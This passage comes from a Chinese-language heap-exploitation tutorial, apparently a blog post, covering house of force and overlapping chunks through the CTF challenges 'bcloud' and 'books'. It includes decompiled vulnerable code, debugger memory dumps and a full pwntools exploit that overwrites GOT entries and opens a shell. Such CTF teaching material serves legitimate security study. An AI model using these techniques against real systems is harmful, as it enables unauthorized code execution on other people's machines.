class=\"line\"><span class=\"number\">0x603520</span> &#123;</div><div class=\"line\">  prev_size = <span class=\"number\">0</span>, </div><div class=\"line\">  size = <span class=\"number\">0</span>, </div><div class=\"line\">  fd = <span class=\"number\">0xffffffffffffffff</span>, </div><div class=\"line\">  bk = <span class=\"number\">0x0</span>, </div><div class=\"line\">  fd_nextsize = <span class=\"number\">0x0</span>, </div><div class=\"line\">  bk_nextsize = <span class=\"number\">0x0</span></div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>然后我们分配一个正好在我们欲修改位置毗邻的大小的堆块，这样我们在再下一次malloc时我们就可以分配到想要的位置了</p>\n<p>我们分配的大小为<code>unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*3 - (unsigned long)ptr_top;</code><br>也就是<code>0xffffffffffffeb28</code>，得到这样一个大数以实现堆的反向分配</p>\n<p>此时我们再分配就得到了<code>bbs_var</code>了，我们可以对<code>bbs_var</code>做读写操作了</p>\n<h4 id=\"例题-1\"><a href=\"#例题-1\" class=\"headerlink\" title=\"例题\"></a>例题</h4><p>2017zctf的dragon和2016bctf的bclould</p>\n<p>先看2016bctf这题<br>在输入姓名时存在有漏洞的截断，当我们输入<code>i</code>个字符时，是在第<code>i+1</code>的位置添加<code>\\x00</code>然而，但是我们后面看到的地址的赋值操作时，会把<code>\\x00</code>给覆盖掉，当我们<code>strcpy</code>时，就会把堆指针给copy进去。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">sub_80487A1</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">char</span> buffer; <span class=\"comment\">// [sp+1Ch] [bp-5Ch]@1</span></div><div class=\"line\">  <span class=\"keyword\">char</span> *_name; <span class=\"comment\">// [sp+5Ch] [bp-1Ch]@1</span></div><div class=\"line\">  <span class=\"keyword\">int</span> v5; <span class=\"comment\">// [sp+6Ch] [bp-Ch]@1</span></div><div class=\"line\"></div><div class=\"line\">  v5 = *MK_FP(__GS__, <span class=\"number\">20</span>);</div><div class=\"line\">  <span class=\"built_in\">memset</span>(&amp;buffer, <span class=\"number\">0</span>, <span class=\"number\">80u</span>);</div><div class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Input your name:\"</span>);</div><div class=\"line\">  read_buf((<span class=\"keyword\">int</span>)&amp;buffer, <span class=\"number\">64</span>, <span class=\"number\">10</span>);</div><div class=\"line\">  _name = (<span class=\"keyword\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">64u</span>);</div><div class=\"line\">  name_addr = (<span class=\"keyword\">int</span>)_name;                                     <span class=\"comment\">//这里存在将'\\x00'覆盖的情况</span></div><div class=\"line\">  <span class=\"built_in\">strcpy</span>(_name, &amp;buffer);</div><div class=\"line\">  sub_8048779((<span class=\"keyword\">int</span>)_name);</div><div class=\"line\">  <span class=\"keyword\">return</span> *MK_FP(__GS__, <span class=\"number\">20</span>) ^ v5;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">pwndbg&gt; telescope <span class=\"number\">0x915d</span>008 <span class=\"number\">20</span></div><div class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│ eax  <span class=\"number\">0x915d</span>008 ◂— <span class=\"number\">0x61616161</span> (<span class=\"string\">'aaaa'</span>)</div><div class=\"line\">... ↓</div><div class=\"line\"><span class=\"number\">0f</span>:<span class=\"number\">003</span>c│      <span class=\"number\">0x915d</span>044 ◂— <span class=\"number\">0x62616161</span> (<span class=\"string\">'aaab'</span>)</div><div class=\"line\"><span class=\"number\">10</span>:<span class=\"number\">0040</span>│      <span class=\"number\">0x915d</span>048 —▸ <span class=\"number\">0x915d</span>008 ◂— <span class=\"number\">0x61616161</span> (<span class=\"string\">'aaaa'</span>)</div><div class=\"line\"><span class=\"number\">11</span>:<span class=\"number\">0044</span>│ edx  <span class=\"number\">0x915d</span>04c ◂— <span class=\"number\">0x20f</span>00</div><div class=\"line\"><span class=\"number\">12</span>:<span class=\"number\">0048</span>│      <span class=\"number\">0x915d</span>050 ◂— <span class=\"number\">0x0</span></div></pre></td></tr></table></figure>\n<p>这里我们能看到输出的是<code>name_addr</code>这个指针的值。</p>\n<p>接下来的<code>org</code>和<code>host</code>的copy其实也存在这个漏洞。<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">sub_804884E</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">char</span> org; <span class=\"comment\">// [sp+1Ch] [bp-9Ch]@1</span></div><div class=\"line\">  <span class=\"keyword\">char</span> *_org; <span class=\"comment\">// [sp+5Ch] [bp-5Ch]@1</span></div><div class=\"line\">  <span class=\"keyword\">int</span> host; <span class=\"comment\">// [sp+60h] [bp-58h]@1</span></div><div class=\"line\">  <span class=\"keyword\">char</span> *_host; <span class=\"comment\">// [sp+A4h] [bp-14h]@1</span></div><div class=\"line\">  <span class=\"keyword\">int</span> v5; <span class=\"comment\">// [sp+ACh] [bp-Ch]@1</span></div><div class=\"line\"></div><div class=\"line\">  v5 = *MK_FP(__GS__, <span class=\"number\">20</span>);</div><div class=\"line\">  <span class=\"built_in\">memset</span>(&amp;org, <span class=\"number\">0</span>, <span class=\"number\">0x90</span>u);</div><div class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Org:\"</span>);</div><div class=\"line\">  read_buf((<span class=\"keyword\">int</span>)&amp;org, <span class=\"number\">64</span>, <span class=\"number\">10</span>);</div><div class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Host:\"</span>);</div><div class=\"line\">  read_buf((<span class=\"keyword\">int</span>)&amp;host, <span class=\"number\">64</span>, <span class=\"number\">10</span>);</div><div class=\"line\">  _host = (<span class=\"keyword\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">64u</span>);</div><div class=\"line\">  _org = (<span class=\"keyword\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">64u</span>);</div><div class=\"line\">  org_addr = (<span class=\"keyword\">int</span>)_org;</div><div class=\"line\">  host_addr = (<span class=\"keyword\">int</span>)_host;</div><div class=\"line\">  <span class=\"built_in\">strcpy</span>(_host, (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *)&amp;host);</div><div class=\"line\">  <span class=\"built_in\">strcpy</span>(_org, &amp;org);</div><div class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"OKay! Enjoy:)\"</span>);</div><div class=\"line\">  <span class=\"keyword\">return</span> *MK_FP(__GS__, <span class=\"number\">20</span>) ^ v5;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>好吧，其实这里还是细心才能看到的漏洞，我们发现<code>strcpy(_org, &amp;org);</code>这里其实是会把<code>org+_org+host</code>的数据全部copy到堆上，实事上我们可以调试发现，<code>host</code>的数据正好覆盖了top chunk的size，也就是<code>wildness</code>，这里我们修改为<code>0xffffffff</code></p>\n<p>覆盖前：<br><figure class=\"highlight dns\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">0</span>x<span class=\"number\">945a098</span>:\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span></div><div class=\"line\"><span class=\"number\">0</span>x<span class=\"number\">945a0a8</span>:\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span></div><div class=\"line\"><span class=\"number\">0</span>x<span class=\"number\">945a0b8</span>:\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span></div><div class=\"line\"><span class=\"number\">0</span>x<span class=\"number\">945a0c8</span>:\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span></div><div class=\"line\"><span class=\"number\">0</span>x<span class=\"number\">945a0d8</span>:\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00020e71</span>\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span></div><div class=\"line\"><span class=\"number\">0</span>x<span class=\"number\">945a0e8</span>:\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span></div></pre></td></tr></table></figure></p>\n<p>覆盖后：<br><figure class=\"highlight dns\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">pwndbg&gt; x/<span class=\"number\">40w</span>x <span class=\"number\">0</span>x<span class=\"number\">945a098</span></div><div class=\"line\"><span class=\"number\">0</span>x<span class=\"number\">945a098</span>:\t<span class=\"number\">0x61616161</span>\t<span class=\"number\">0x61616161</span>\t<span class=\"number\">0x61616161</span>\t<span class=\"number\">0x61616161</span></div><div class=\"line\"><span class=\"number\">0</span>x<span class=\"number\">945a0a8</span>:\t<span class=\"number\">0x61616161</span>\t<span class=\"number\">0x61616161</span>\t<span class=\"number\">0x61616161</span>\t<span class=\"number\">0x61616161</span></div><div class=\"line\"><span class=\"number\">0</span>x<span class=\"number\">945a0b8</span>:\t<span class=\"number\">0x61616161</span>\t<span class=\"number\">0x61616161</span>\t<span class=\"number\">0x61616161</span>\t<span class=\"number\">0x61616161</span></div><div class=\"line\"><span class=\"number\">0</span>x<span class=\"number\">945a0c8</span>:\t<span class=\"number\">0x61616161</span>\t<span class=\"number\">0x61616161</span>\t<span class=\"number\">0x61616161</span>\t<span class=\"number\">0x61616161</span></div><div class=\"line\"><span class=\"number\">0</span>x<span class=\"number\">945a0d8</span>:\t<span class=\"number\">0</span>x<span class=\"number\">0945a098</span>\t<span class=\"number\">0</span>xffffffff\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span></div><div class=\"line\"><span class=\"number\">0</span>x<span class=\"number\">945a0e8</span>:\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span>\t<span class=\"number\">0x00000000</span></div></pre></td></tr></table></figure></p>\n<p>我们发现<code>0x945a0d8</code>这行的值被修改为我们想要的<code>0xffffffff</code>了。</p>\n<p>这题能够通过<code>house of force</code>来解决。</p>\n<p>我实现的步骤：</p>\n<ol>\n<li>leak name_addr 的堆地址，并通过计算得到top chunk的地址</li>\n<li>修改wildness为<code>0xffffffff(-1)</code></li>\n<li>分配一个大小为<code>wanted_addr - top_chunk_addr</code>堆块， 此时再分配得到的堆块即在<code>wanted_addr</code>地址上，我们就可以操纵这里的数据了</li>\n<li>修改此处的堆块数据，覆盖<code>content_addr[]</code>为<code>free_got, read_got, atoi_got</code></li>\n<li><code>edit()</code>id0的结构，修改<code>free_got</code>为<code>printf</code></li>\n<li><code>delete()</code>id1，泄露<code>read</code>的地址</li>\n<li><code>edit()</code>id2， 修改<code>atoi</code>为<code>system</code></li>\n<li>getshell</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></div><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">context(log_level = <span class=\"string\">'critical'</span>)</div><div class=\"line\"></div><div class=\"line\">p = process(<span class=\"string\">'./bcloud'</span>)</div><div class=\"line\">elf = ELF(<span class=\"string\">'./bcloud'</span>)</div><div class=\"line\">libc = ELF(<span class=\"string\">'/lib32/libc.so.6'</span>)</div><div class=\"line\"></div><div class=\"line\">atoi_got = elf.got[<span class=\"string\">'atoi'</span>]</div><div class=\"line\">read_got = elf.got[<span class=\"string\">'read'</span>]</div><div class=\"line\">free_got = elf.got[<span class=\"string\">'free'</span>]</div><div class=\"line\">printf_plt = elf.plt[<span class=\"string\">'printf'</span>]</div><div class=\"line\"></div><div class=\"line\">bss = <span class=\"number\">0x0804B060</span></div><div class=\"line\">content_length = <span class=\"number\">0x0804b0a0</span></div><div class=\"line\">content_addr = <span class=\"number\">0x804B120</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">new</span><span class=\"params\">(length, content)</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'&gt;&gt;\\n'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'1'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'content:\\n'</span>)</div><div class=\"line\">    p.sendline(str(length))</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'content:\\n'</span>)</div><div class=\"line\">    p.sendline(content)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(index, content)</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'&gt;&gt;\\n'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'3'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'id:\\n'</span>)</div><div class=\"line\">    p.sendline(str(index))</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'content:\\n'</span>)</div><div class=\"line\">    p.sendline(content)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'success.\\n'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leak_overwrite_wildness</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'name:\\n'</span>)</div><div class=\"line\"><span class=\"comment\">#   raw_input()</span></div><div class=\"line\">    p.send(<span class=\"string\">'a'</span> * (<span class=\"number\">0x40</span> - <span class=\"number\">1</span>) + <span class=\"string\">'b'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'b'</span>)</div><div class=\"line\">    addr = p.recv(<span class=\"number\">4</span>)</div><div class=\"line\">    p.recvline()</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Org:\\n'</span>)</div><div class=\"line\">    p.send(<span class=\"string\">'a'</span> * <span class=\"number\">0x40</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'Host:\\n'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'\\xff\\xff\\xff\\xff'</span>)</div><div class=\"line\">    <span class=\"keyword\">return</span> u32(addr)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></div><div class=\"line\"><span class=\"comment\">#   leak name_heap_addr </span></div><div class=\"line\">    name_heap_addr = leak_overwrite_wildness()</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'name_heap =&gt; '</span>, hex(name_heap_addr - <span class=\"number\">0x08</span>)</div><div class=\"line\">    base_heap = name_heap_addr + <span class=\"number\">0xd0</span></div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'base_heap =&gt; '</span>, hex(base_heap)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#   malloc a gabage chunk to bss</span></div><div class=\"line\">    offset = bss - base_heap + <span class=\"number\">0x30</span></div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'offset =&gt; '</span>, offset</div><div class=\"line\">    new(offset, <span class=\"string\">'abcdabcd'</span>) <span class=\"comment\"># id0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#   malloc a chunk on bss of free and overwrite content_length[] &amp; content_addr[]</span></div><div class=\"line\">    payload = <span class=\"string\">''</span></div><div class=\"line\">    payload += p32(<span class=\"number\">4</span>)</div><div class=\"line\">    payload += p32(<span class=\"number\">4</span>)</div><div class=\"line\">    payload += p32(<span class=\"number\">4</span>)</div><div class=\"line\">    payload += (content_addr - content_length - len(payload)) * <span class=\"string\">'\\x00'</span></div><div class=\"line\">    payload += p32(free_got)  <span class=\"comment\"># id0</span></div><div class=\"line\">    payload += p32(read_got)  <span class=\"comment\"># id1</span></div><div class=\"line\">    payload += p32(atoi_got)  <span class=\"comment\"># id2</span></div><div class=\"line\">    new(<span class=\"string\">'168'</span>, payload)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#   overwrite free_got with printf_plt</span></div><div class=\"line\">    edit(<span class=\"number\">0</span>, p32(printf_plt))</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#   '4.Delete' to printf libc to get system_addr</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'&gt;&gt;\\n'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'4'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'id:\\n'</span>)</div><div class=\"line\">    p.sendline(str(<span class=\"number\">1</span>))</div><div class=\"line\">    read_addr = u32(p.recv(<span class=\"number\">4</span>))</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'read_addr =&gt; '</span>, read_addr</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#   modify atoi to system</span></div><div class=\"line\">    libc.address = read_addr - libc.symbols[<span class=\"string\">'read'</span>]</div><div class=\"line\">    system_addr = libc.symbols[<span class=\"string\">'system'</span>]</div><div class=\"line\">    payload2 = p32(system_addr)</div><div class=\"line\">    edit(<span class=\"number\">2</span>, payload2)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#   getshell</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'&gt;&gt;\\n'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'/bin/sh\\n'</span>)</div><div class=\"line\">    p.interactive()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    main()</div></pre></td></tr></table></figure>\n<h2 id=\"0x09-overlapping-chunks\"><a href=\"#0x09-overlapping-chunks\" class=\"headerlink\" title=\"0x09 overlapping chunks\"></a>0x09 overlapping chunks</h2><p>除了how2heap上演示的extend freed chunks，参考了这篇<a href=\"http://blog.dazzlepppp.cn/2016/10/15/Producing-Overlapping-Chunks/\">文章</a>后面的内容。</p>\n<p>堆块重叠指两块不同的堆块存在重叠部分，以至于我们写任意一块时也会覆写到另一块堆块中。<br>how2heap给出的演示程序中的意思是，当我们修改了一个已经被free了的chunk的size时，我们再次分配就可以得到一个修改后size的堆块，然后就可以构成堆块重叠，修改当前堆块将会修改到后一个堆块。</p>\n<p>查阅资料的过程中发现还可以在free之前修改size的大小，但是实际测试会发现在free的时候会崩溃，暂时没有找到原因。</p>\n<p>以how2heap例题2015hack.lu的books为例。</p>\n<p>存在明显的堆溢出，程序逻辑如下<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">signed</span> __int64 __<span class=\"function\">fastcall <span class=\"title\">main</span><span class=\"params\">(__int64 a1, <span class=\"keyword\">char</span> **a2, <span class=\"keyword\">char</span> **a3)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">signed</span> __int64 result; <span class=\"comment\">// rax@4</span></div><div class=\"line\">  __int64 v4; <span class=\"comment\">// rcx@16</span></div><div class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> v5; <span class=\"comment\">// [sp+4h] [bp-BCh]@5</span></div><div class=\"line\">  <span class=\"keyword\">void</span> *final_str; <span class=\"comment\">// [sp+8h] [bp-B8h]@0</span></div><div class=\"line\">  <span class=\"keyword\">void</span> *order1; <span class=\"comment\">// [sp+18h] [bp-A8h]@1</span></div><div class=\"line\">  <span class=\"keyword\">void</span> *order2; <span class=\"comment\">// [sp+20h] [bp-A0h]@1</span></div><div class=\"line\">  <span class=\"keyword\">char</span> *dest; <span class=\"comment\">// [sp+28h] [bp-98h]@1</span></div><div class=\"line\">  <span class=\"keyword\">char</span> s; <span class=\"comment\">// [sp+30h] [bp-90h]@6</span></div><div class=\"line\">  __int64 v11; <span class=\"comment\">// [sp+B8h] [bp-8h]@1</span></div><div class=\"line\"></div><div class=\"line\">  v11 = *MK_FP(__FS__, <span class=\"number\">40L</span>L);</div><div class=\"line\">  order1 = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x80</span>uLL);</div><div class=\"line\">  order2 = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x80</span>uLL);</div><div class=\"line\">  dest = (<span class=\"keyword\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x80</span>uLL);</div><div class=\"line\">  <span class=\"keyword\">if</span> ( order1 &amp;&amp; order2 &amp;&amp; dest )</div><div class=\"line\">  &#123;</div><div class=\"line\">    v5 = <span class=\"number\">0</span>;</div><div class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\" Crappiest and most expensive books for your college education!\\n\\nWe can order books for you in case they're not in stock.\\nMax. two orders allowed!\\n\"</span>);</div><div class=\"line\">    <span class=\"keyword\">while</span> (</div><div class=\"line\">    &#123;</div><div class=\"line\">      <span class=\"keyword\">if</span> ( v5 )</div><div class=\"line\">      &#123;</div><div class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"%s\"</span>, final_str);</div><div class=\"line\">        <span class=\"built_in\">printf</span>(dest);                           <span class=\"comment\">// fsb</span></div><div class=\"line\">        result = <span class=\"number\">0L</span>L;</div><div class=\"line\">        <span class=\"keyword\">goto</span> finish;</div><div class=\"line\">      &#125;</div><div class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">\"1: Edit order 1\"</span>);</div><div class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">\"2: Edit order 2\"</span>);</div><div class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">\"3: Delete order 1\"</span>);</div><div class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">\"4: Delete order 2\"</span>);</div><div class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">\"5: Submit\"</span>);</div><div class=\"line\">      fgets(&amp;s, <span class=\"number\">128</span>, <span class=\"built_in\">stdin</span>);</div><div class=\"line\">      <span class=\"keyword\">switch</span> ( s )</div><div class=\"line\">      &#123;</div><div class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">'1'</span>:</div><div class=\"line\">          <span class=\"built_in\">puts</span>(<span class=\"string\">\"Enter first order:\"</span>);</div><div class=\"line\">          edit((__int64)order1);</div><div class=\"line\">          <span class=\"built_in\">strcpy</span>(dest, <span class=\"string\">\"Your order is submitted!\\n\"</span>);</div><div class=\"line\">          <span class=\"keyword\">continue</span>;</div><div class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">'2'</span>:</div><div class=\"line\">          <span class=\"built_in\">puts</span>(<span class=\"string\">\"Enter second order:\"</span>);</div><div class=\"line\">          edit((__int64)order2);</div><div class=\"line\">          <span class=\"built_in\">strcpy</span>(dest, <span class=\"string\">\"Your order is submitted!\\n\"</span>);</div><div class=\"line\">          <span class=\"keyword\">continue</span>;</div><div class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">'3'</span>:</div><div class=\"line\">          <span class=\"keyword\">delete</span>(order1);</div><div class=\"line\">          <span class=\"keyword\">continue</span>;</div><div class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">'4'</span>:</div><div class=\"line\">          <span class=\"keyword\">delete</span>(order2);</div><div class=\"line\">          <span class=\"keyword\">continue</span>;</div><div class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">'5'</span>:</div><div class=\"line\">          final_str = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x140</span>uLL);</div><div class=\"line\">          <span class=\"keyword\">if</span> ( !final_str )</div><div class=\"line\">          &#123;</div><div class=\"line\">            fwrite(<span class=\"string\">\"Something 